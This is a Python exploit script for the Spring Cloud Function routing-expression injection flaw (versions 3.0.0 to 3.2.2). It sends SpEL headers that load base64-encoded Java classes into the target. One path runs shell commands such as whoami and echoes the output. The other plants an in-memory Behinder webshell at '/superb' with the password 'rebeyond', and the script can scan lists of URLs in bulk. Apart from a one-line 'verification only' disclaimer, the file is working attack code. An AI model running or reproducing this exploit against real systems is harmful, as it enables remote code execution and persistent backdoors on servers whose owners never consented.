# coding:utf-8
# amazingday

import requests
import argparse
from urllib.parse import urljoin

a = '''                                                                      
                                          仅验证禁止一切违法！！！
                                          by gelinlang
                                          影响版本：3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2
                                          python SpringCloudFunction_rce.py -h
'''
print(a)

def Exploit(url):
    headers = {
        "spring.cloud.function.routing-expression": "T(org.springframework.cglib.core.ReflectUtils).defineClass('testEcho',T(org.springframework.util.Base64Utils).decodeFromString((T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getParameter(\"test\"))),T(org.springframework.util.ClassUtils).getDefaultClassLoader())",
        "Accept-Cache": "whoami",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
    data = "test=yv66vgAAADQAwgoACQBjCgBkAGUKAGQAZggAZwoAaABpCABqBwBrCgAHAGwHAG0KAG4AbwgAcAgAcQgAcggAcwgASAcAdAoABwB1CAB2CABJCAB3CABKCgBuAHgIAHkIAHoKAHsAfAoAEAB9CAB%2bCgAQAH8IAEsIAIAIAIEIAIIKAIMAhAoAgwCFCgCGAIcHAIgHAIkIAIoKACUAiwoAJACMBwCNCgApAGMKACQAjgoAKQCPCACQCACRCgApAJIKAAkAkwgAlAgAlQgAlggAlwcAmAcAmQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTHRlc3RFY2hvOwEACDxjbGluaXQ%2bAQABYwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABbQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAm0xAQAEcmVzcAEAA3JlcQEACWdldEhlYWRlcgEACXNldEhlYWRlcgEACWdldFdyaXRlcgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAGd3JpdGVyAQANU3RhY2tNYXBUYWJsZQcAawcAmgcAbQcAdAcATgcAmwcAiAcAjQcAmAEAClNvdXJjZUZpbGUBAA10ZXN0RWNoby5qYXZhDAA3ADgHAJwMAJ0AngwAnwCgAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwChDACiAKMBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwApAClAQAQamF2YS9sYW5nL09iamVjdAcAmgwApgCnAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAJWphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldFJlcXVlc3QBABBqYXZhL2xhbmcvU3RyaW5nDACoAKUBACZqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACpAKoBAAxBY2NlcHQtQ2FjaGUBAAdvcy5uYW1lBwCrDACsAK0MAK4ArwEAA1dJTgwAsACxAQACL2MBAAcvYmluL3NoAQACLWMHALIMALMAtAwAtQC2BwC3DAC4ALkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgEAA0dCSwwANwC6DAA3ALsBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAvACvDAC9AL4BAAEKAQAMQ29udGVudC1hdXRoDAC/AK8MAMAAwQEAB3ByaW50bG4BADplcnJvcixUaGlzIGFwcGxpY2F0aW9uIGhhcyBubyBleHBsaWNpdCBtYXBwaW5nIGZvciAvZXJyb3IuAQAFZmx1c2gBAAVjbG9zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAh0ZXN0RWNobwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwAhADYACQAAAAAAAgABADcAOAABADkAAAAvAAEAAQAAAAUqtwABsQAAAAIAOgAAAAYAAQAAAAUAOwAAAAwAAQAAAAUAPAA9AAAACAA%2bADgAAQA5AAADmQAGABAAAAHQuAACtgADEgS2AAVLKhIGA70AB7YACEwrAQO9AAm2AApNuAACtgADEgu2AAVLKhIMA70AB7YACEwqEg0DvQAHtgAITissA70ACbYACjoELSwDvQAJtgAKOgW4AAK2AAMSDrYABRIPBL0AB1kDEhBTtgAROga4AAK2AAMSErYABRITBb0AB1kDEhBTWQQSEFO2ABE6B7gAArYAAxIUtgAFEhUDvQAHtgAROggZCAS2ABYZBwS2ABYZBgS2ABYZBhkFBL0ACVkDEhdTtgAKwAAQOgkGvQAQOgoSGLgAGbYAGhIbtgAcmQASGQoDEh1TGQoEEh5TpwAPGQoDEh9TGQoEEiBTGQoFGQlTuAAhGQq2ACK2ACM6C7sAJFm7ACVZGQsSJrcAJ7cAKDoMAToNuwApWbcAKjoOGQy2ACtZOg3GABYZDhkNtgAsVxkOEi22ACxXp//lGQcZBAW9AAlZAxIuU1kEGQ62AC9TtgAKVxkIGQQDvQAJtgAKOg8ZD7YAMBIxBL0AB1kDEhBTtgARGQ8EvQAJWQMSMlO2AApXGQ%2b2ADASMwO9AAe2ABEZDwO9AAm2AApXGQ%2b2ADASNAO9AAe2ABEZDwO9AAm2AApXpwAES7EAAQAAAcsBzgA1AAMAOgAAAJYAJQAAAAgADAAJABcACgAhAAsALQAMADgADQBDAA4ATgAPAFkAEAB0ABEAlAASAKoAEwCwABQAtgAVALwAFgDRABcA1wAYAOcAGQDtABoA9gAcAPwAHQECAB8BCAAgARUAIQEpACIBLAAjATUAJAFAACUBSAAmAVMAKAFsACkBeQAqAZsAKwGzACwBywAwAc4ALgHPADEAOwAAAKIAEAAMAb8APwBAAAAAFwG0AEEAQgABACEBqgBDAEQAAgBDAYgARQBCAAMATgF9AEYARAAEAFkBcgBHAEQABQB0AVcASABCAAYAlAE3AEkAQgAHAKoBIQBKAEIACADRAPoASwBMAAkA1wD0AE0ATgAKARUAtgBPAFAACwEpAKIAUQBSAAwBLACfAFMATAANATUAlgBUAFUADgF5AFIAVgBEAA8AVwAAAGsABv8A9gALBwBYBwBZBwBaBwBZBwBaBwBaBwBZBwBZBwBZBwBbBwBcAAAL/wAyAA8HAFgHAFkHAFoHAFkHAFoHAFoHAFkHAFkHAFkHAFsHAFwHAF0HAF4HAFsHAF8AAB3/AHoAAAABBwBgAAABAGEAAAACAGI="

    try:
        url = url + "functionRouter"
        req = requests.post(url=url, timeout=3)
        text = req.text
        rsp = "Internal Server Error"

        if req.status_code == 500 and rsp in text:
            print(url + '存在接口')
        res = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
        if res.headers.get("Content-auth"):
            print("Exist！Find echo")
            print(res.headers.get("Content-auth"))
        else:
            print("No Find echo，请手动确认接口是否存在漏洞")
    except Exception as e:
        print(e)
        pass

def Inject(url):
    headers = {
        "spring.cloud.function.routing-expression": "T(org.springframework.cglib.core.ReflectUtils).defineClass('injectSuper',T(org.springframework.util.Base64Utils).decodeFromString((T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getParameter(\"test\"))),T(org.springframework.util.ClassUtils).getDefaultClassLoader())",
        "Accept-Cache": "whoami",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
    data = "test=yv66vgAAADQBJwoASwCTCACUCQAXAJUKAEsAlgoASwCXCgCYAJkHAJoKAAcAmwoABwCcCwCdAJ4LAJ0AnwgAoAoAPgChCACiCgCjAKQLAKUApggApwoAqACpBwCqCgA%2bAKsKABMArAoAqACtBwCuCgBLAK8KABcAkwsAnQCwCgCxALIHALMKABwAlgoAHAC0CgCoALUKABcAtgcAtwoAIQCWCABsCwC4ALkIAGgIAGoKADEAugoAowChBwC7CAC8CwC9AL4HAL8IAMAHAMELACwAwggAXgcAwwoAMQDECgAXAJYKAMUAxggAxwoAPgDIBwDJCgA3AJYHAMoKADkAlgoANwDLCADMCQBAAM0HAM4KAEkAzwcA0AsA0QDSCwDRANMLANEA1AoALgDVBwDWCgBFANcHANgKAEcA2QcA2goASQDbBwDcAQABawEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAQTGluamVjdFN1cGVyTmV3OwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAMoKVYBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEABHRlc3QBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAJpbgEABmJhc2U2NAEADWJ5dGVzRW5jcnlwdGUBAA1ieXRlc2RlY3J5cHRlAQAIbmV3Q2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAC3BhZ2VDb250ZXh0AQAPTGphdmEvdXRpbC9NYXA7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs%2bOwEADVN0YWNrTWFwVGFibGUHAN0HAN4HAN8HALsBAApFeGNlcHRpb25zBwDgAQAIPGNsaW5pdD4BAAdvcHRpb25zAQAUQnVpbGRlckNvbmZpZ3VyYXRpb24BAAxJbm5lckNsYXNzZXMBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjsBAANrZXkBAA1yZXF1ZXN0TWV0aG9kAQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAA3VybAEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAAm1zAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAEaW5mbwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAHbWV0aG9kMgEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQASaW5qZWN0VG9Db250cm9sbGVyBwC/BwDBBwDhBwCuAQAKU291cmNlRmlsZQEAE2luamVjdFN1cGVyTmV3LmphdmEMAE8AUAEAEGU0NWUzMjlmZWI1ZDkyNWIMAEwATQwATwBZDADiAOMHAOQMAOUA5gEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAOcA6AwA6QDqBwDdDADrAOwMAO0A7gEABFBPU1QMAO8A8AEAAXUHAPEMAPIA8wcA3wwA9AD1AQADQUVTBwD2DAD3APgBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAD5APoMAE8A%2bwwA/AD9AQAOaW5qZWN0U3VwZXJOZXcMAP4A/wwBAAEBBwECDAEDAO4BABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEEAQUMAQYBBwwAWgBbAQARamF2YS91dGlsL0hhc2hNYXAHAQgMAQkBCgwBCwEMAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcBDQwBDgEPAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwBEAERAQAPamF2YS9sYW5nL0NsYXNzDADtARIHARMMARQA7gEADTIuNi4wLlJFTEVBU0UMARUBFgEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIMARcBGAEABy9zdXBlcmIMAKAAfgEAEGphdmEvbGFuZy9TdHJpbmcMARkBGwEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kBwEcDAEdAR4MAHgBHwwBIAEhDAEiASMBAEZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uDABPASQBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uDABPASUBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDABPASYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAJZ2V0TWV0aG9kAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABBqYXZhL2xhbmcvT2JqZWN0AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAFGdldFN5c3RlbUNsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAA1qYXZhL3V0aWwvTWFwAQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEANyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAqb3JnL3NwcmluZ2ZyYW1ld29yay9ib290L1NwcmluZ0Jvb3RWZXJzaW9uAQAKZ2V0VmVyc2lvbgEACWNvbXBhcmVUbwEAFShMamF2YS9sYW5nL1N0cmluZzspSQEAEHNldFBhdHRlcm5QYXJzZXIBADsoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVyblBhcnNlcjspVgEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHbWV0aG9kcwEAgShbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyOwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWACEAFwBLAAAAAQASAEwATQABAE4AAAACAAIABQABAE8AUAACAFEAAABIAAIAAgAAAAwqK7cAASoSArUAA7EAAAACAFIAAAAOAAMAAAA/AAUAGQALAD8AUwAAABYAAgAAAAwAVABVAAAAAAAMAFYAVwABAFgAAAAFAQBWAAAAAQBPAFkAAQBRAAAAPQACAAEAAAALKrcABCoSArUAA7EAAAACAFIAAAAOAAMAAABAAAQAGQAKAEAAUwAAAAwAAQAAAAsAVABVAAAAAQBaAFsAAgBRAAAAPQAEAAIAAAAJKisDK763AAWwAAAAAgBSAAAABgABAAAAQwBTAAAAFgACAAAACQBUAFUAAAAAAAkAXABdAAEAWAAAAAUBAFwAAAABAF4AWQACAFEAAAHZAAYACwAAANC4AAbAAAfAAAe2AAhMuAAGwAAHwAAHtgAJTSu5AAoBAE4ruQALAQASDLYADZkAni0SDiq2AA9XEgK5ABADABIRuAASOgQZBAW7ABNZKrYAD1cSArYAFBIRtwAVtgAWuwAXWbgAGLcAGToFK7kAGgEAtgAbOga7ABxZtwAdGQa2AB46BxkEGQe2AB86CBkFGQi2ACA6CbsAIVm3ACI6ChkKEiMtuQAkAwBXGQoSJSu5ACQDAFcZChImLLkAJAMAVxkJtgAnGQq2AChXpwAFOgSxAAEAIQDKAM0AKQAEAFIAAABOABMAAABJAA0ASgAaAEsAIQBPAC8AUAA%2bAFEARQBSAF4AUwBqAFQAdQBVAIMAVgCMAFcAlQBYAJ4AWQCpAFoAtABbAL8AXADKAGAAzwBhAFMAAABwAAsARQCFAFYAXwAEAGoAYABgAFUABQB1AFUAYQBNAAYAgwBHAGIAXQAHAIwAPgBjAF0ACACVADUAZABlAAkAngAsAGYAZwAKAAAA0ABUAFUAAAANAMMAaABpAAEAGgC2AGoAawACACEArwBsAG0AAwBuAAAADAABAJ4ALABmAG8ACgBwAAAAEwAD/gDKBwBxBwByBwBzQgcAdAEAdQAAAAQAAQB2AAgAdwBZAAEAUQAAAeAACQAIAAAAy7gABhIqA7kAKwMAwAAsSyoSLRIuuQAvAwDAAC5MEhcSMAO9ADG2ADJNuwAXWbcAM064ADQSNbYANp4AVLsAN1m3ADg6BBkEuwA5WbcAOrYAOxI8OgWyAD06BgS9AD5ZAxkFU7gAPwS9AEBZAxkGU7kAQQIAGQS5AEICALkAQwEAOgcrGQctLLYARKcAPLsARVkEvQA%2bWQMSPFO3AEY6BLsAR1kDvQBAtwBIOgW7AElZGQQZBQEBAQEBtwBKOgYrGQYtLLYARKcABEuxAAEAAADGAMkAKQADAFIAAABeABcAAAAeAA8AHwAdACIAKQAkADEAJQA8ACYARQAnAFEAKABVACkAWgAqAGMAKwBvACwAdgAtAHsALgCCAC8AigAwAI0AMgCfADQArAA2AL4AOADGADwAyQA6AMoAPQBTAAAAcAALAEUARQB4AHsABABVADUAfABNAAUAWgAwAH0AfgAGAIIACAB/AIAABwCfACcAgQCCAAQArAAaAIMAhAAFAL4ACACFAIAABgAPALcAhgCHAAAAHQCpAIgAiQABACkAnQCKAIsAAgAxAJUAjABVAAMAcAAAACEABP8AjQAEBwCNBwCOBwCPBwCQAAD/ADgAAAAAQgcAdAAAAgCRAAAAAgCSAHoAAAASAAIANwBJAHkACQDRAEkBGgYJ"

    try:
        posturl = url + "functionRouter"
        requests.post(posturl, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
        checkurl = url + "superb"
        checkres = requests.get(checkurl, data=data, timeout=10, allow_redirects=False, verify=False)
        if checkres.status_code ==404:
            print("No Inject")
        else :
           print("Inject Behinder！pass:rebeyond")
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Srping_Cloud_Function_Rce')
    parser.add_argument('-file', help='url file', required=False)
    parser.add_argument('-url', help='target url', required=False)
    parser.add_argument('-inject', help='inject behinder shell', required=False, action='store_true')
    args = parser.parse_args()
    if args.url:
        if args.inject:
            Inject(args.url)
        else:
            Exploit(args.url)
    if args.file:
        with open(args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)


if __name__ == '__main__':
    main()
